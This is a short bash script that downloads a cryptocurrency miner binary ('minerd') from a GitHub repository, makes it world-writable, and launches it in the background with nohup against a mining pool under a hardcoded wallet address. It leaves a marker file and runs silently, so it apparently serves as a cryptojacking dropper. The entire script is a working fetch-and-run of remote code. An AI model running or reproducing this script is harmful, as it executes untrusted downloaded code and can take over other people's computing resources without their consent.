#!/bin/bash
cd /data
touch exist
curl -LO https://github.com/2319763378/pool/raw/master/minerd
chmod 777 minerd
nohup ./minerd -a CryptoVantaa -o stratum+tcp://pool.etgd.com:3113 -u ETmF5wiWCPjMyXEoEbEGoL6UkcAXAvT7Ah -p c=IOTE &
